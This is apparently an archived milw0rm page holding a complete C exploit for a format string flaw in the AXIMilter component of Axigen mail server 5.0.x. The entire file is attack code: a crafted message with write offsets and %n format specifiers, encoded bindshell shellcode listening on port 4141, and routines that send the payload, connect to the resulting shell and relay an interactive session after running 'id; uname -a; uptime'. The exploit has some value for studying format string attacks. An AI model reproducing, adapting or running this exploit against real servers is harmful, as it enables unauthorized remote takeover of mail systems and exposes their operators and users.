<html><head><title>Axigen <= 5.0.2 AXIMilter Remote Format String Exploit</title></head><pre>/*
 * Axigen 5.0.x AXIMilter Format String Exploit
 *
 * by hempel (JAN 16 2008)
 *
 * thx to mu-b (digit-labs.org)
 *
 */
#include &lt;stdio.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/uio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;

char buf[] = 
    &quot;FROM:\r\nEHLO:\r\nCNIP:\r\nCNPO:\r\nCNHO: &quot;
/* offsets */
    &quot;\xb8\x96\x05\x08\xb9\x96\x05\x08\xba\x96\x05\x08\xbb\x96\x05\x08&quot;
    &quot;\xbc\x96\x05\x08\xbd\x96\x05\x08\xbe\x96\x05\x08\xbf\x96\x05\x08&quot;
    &quot;\xc0\x96\x05\x08&quot;
/* format string */
    &quot;%35u%6851$n%70u%6850$hhn%47u%6846$hhn%36u%6854$hhn%31u%6853$hhn%&quot;
    &quot;17u%6852$hhn%134u%6847$hhn%111u%6848$hhn%259u%6849$hhn&quot;
    &quot;\r\nRCPT:\r\nVERI: &quot;
/* bindshell code (port 4141) */
    &quot;\x33\xc9\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xdc&quot;
    &quot;\xc8\x06\xb7\x83\xeb\xfc\xe2\xf4\xed\x13\x55\xf4\x8f\xa2\x04\xdd&quot;
    &quot;\xba\x90\x9f\x3e\x3d\x05\x86\x21\x9f\x9a\x60\xdf\xcc\xe5\x60\xe4&quot;
    &quot;\x55\x29\x6c\xd1\x84\x98\x57\xe1\x55\x29\xcb\x37\x6c\xae\xd7\x54&quot;
    &quot;\x11\x48\x54\xe5\x8a\x8b\x8f\x56\x6c\xae\xcb\x37\x4f\xa2\x04\xee&quot;
    &quot;\x6c\xf7\xcb\x37\x95\xb1\xff\x07\xd7\x9a\x6e\x98\xf3\xbb\x6e\xdf&quot;
    &quot;\xf3\xaa\x6f\xd9\x55\x2b\x54\xe4\x55\x29\xcb\x37&quot;
    &quot;\r\nPASS:\r\n&quot;;

static int
shell_sock (char *host, int port)
{
    struct sockaddr_in addr;
    int sockfd;

    sockfd = socket(PF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        perror (&quot;socket&quot;);
	return 0;
    }
    
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(host);
    addr.sin_port = htons(port);

    if (connect(sockfd, (struct sockaddr *) &amp;addr, sizeof(addr)) == -1) {
        perror (&quot;connect&quot;);
	return 0;
    }

    return sockfd;
}

static void
shell_run (int sockfd)
{
    int rs;
    fd_set rset;
    char rbuf[1024], *cmd = &quot;id; uname -a; uptime\n&quot;;

    write(sockfd, cmd, strlen(cmd));
 
    while (1) {
        FD_ZERO (&amp;rset);
        FD_SET (sockfd, &amp;rset);
        FD_SET (STDIN_FILENO, &amp;rset);
        
	select (sockfd + 1, &amp;rset, NULL, NULL, NULL);
	if (FD_ISSET (sockfd, &amp;rset)) {
	    rs = read (sockfd, rbuf, sizeof(rbuf) - 1);
            if (rs &lt;= 0) {
                perror(&quot;read&quot;);
		return;
            }
	    rbuf[rs] = '\0';
            printf (&quot;%s&quot;, rbuf);
        }
        
	if (FD_ISSET (STDIN_FILENO, &amp;rset)) {
	    rs = read(STDIN_FILENO, rbuf, sizeof(rbuf) - 1);
            if (rs &gt; 0) {
        	rbuf[rs] = '\0';
        	write (sockfd, rbuf, rs);
            }
        }
    }
}

int 
main(int argc, char **argv)
{
    int sockfd, port, buf_len;
    struct sockaddr_in addr;
    char *host;
    
    printf(&quot;AXIGEN 5.0.x AXIMilter format string Exploit by hempel\n&quot;);
    
    if (argc &lt; 2) {
	printf(&quot;%s host port\n&quot;, *argv);
	return 0;
    }
    
    host = argv[1];
    port = atoi(argv[2]);
        
    sockfd = socket(PF_INET, SOCK_STREAM, 0);
    if(sockfd == -1) {
	perror(&quot;socket&quot;);
	return -1;
    }
    
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(host);
    addr.sin_port = htons(port);
    
    if (connect(sockfd, (struct sockaddr *) &amp;addr, sizeof(addr)) == -1) {
	perror(&quot;connect&quot;);
	return -1;
    }
    
    buf_len = sizeof(buf) - 1;
    if (write(sockfd, buf, buf_len) == -1) {
	perror(&quot;write&quot;);
	return -1;
    }    
    close(sockfd);

    printf(&quot;trying shell at %s:4141 ...&quot;, host);
    fflush(stdout);
    sockfd = shell_sock(host, 4141);
    if (sockfd) {
	printf(&quot;w00t!\n&quot;);
	shell_run(sockfd);
    } else {
	printf(&quot;nope!\n&quot;);
    }
    
    return 0;
}

// milw0rm.com [2008-01-21]</pre></html>